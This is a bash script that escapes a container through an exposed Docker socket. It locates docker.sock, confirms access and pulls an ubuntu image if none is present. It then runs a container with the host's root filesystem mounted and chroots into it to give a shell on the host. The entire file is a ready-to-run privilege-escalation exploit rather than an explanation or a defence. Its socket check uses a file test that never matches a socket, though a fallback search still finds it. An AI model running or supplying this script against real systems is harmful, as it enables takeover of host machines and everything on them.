#!/bin/bash
# Docker Socket Escape Script
# Exploits exposed docker socket to escape container

SOCKET_PATH="${1:-/var/run/docker.sock}"

echo "=== Docker Socket Escape ==="
echo "Target socket: $SOCKET_PATH"
echo ""

# Check if socket exists
if [ ! -f "$SOCKET_PATH" ]; then
    echo "Socket not found at $SOCKET_PATH"
    echo "Searching for docker socket..."
    SOCKET_PATH=$(find / -name docker.sock 2>/dev/null | head -1)
    if [ -z "$SOCKET_PATH" ]; then
        echo "No docker socket found on system"
        exit 1
    fi
    echo "Found socket at: $SOCKET_PATH"
fi

# Set docker host if not default
if [ "$SOCKET_PATH" != "/var/run/docker.sock" ]; then
    export DOCKER_HOST="unix://$SOCKET_PATH"
fi

echo ""
echo "[1] Testing docker connection..."
docker info > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "Docker connection successful!"
else
    echo "Docker connection failed"
    exit 1
fi
echo ""

# List available images
echo "[2] Available images:"
docker images
echo ""

# Try escape method 1: Mount host filesystem
echo "[3] Attempting escape via host filesystem mount..."
echo "This will create a container with / mounted from host"
echo ""

# Check if we have an ubuntu image or need to pull one
if ! docker images | grep -q ubuntu; then
    echo "Pulling ubuntu image..."
    docker pull ubuntu:latest
fi

# Attempt the escape
echo "Running escape container..."
echo "If successful, you'll get a shell on the host"
echo ""

docker run -it --rm -v /:/host ubuntu:latest chroot /host /bin/bash

if [ $? -eq 0 ]; then
    echo ""
    echo "Escape successful! You should now have a host shell."
else
    echo ""
    echo "Escape attempt failed or was interrupted"
fi
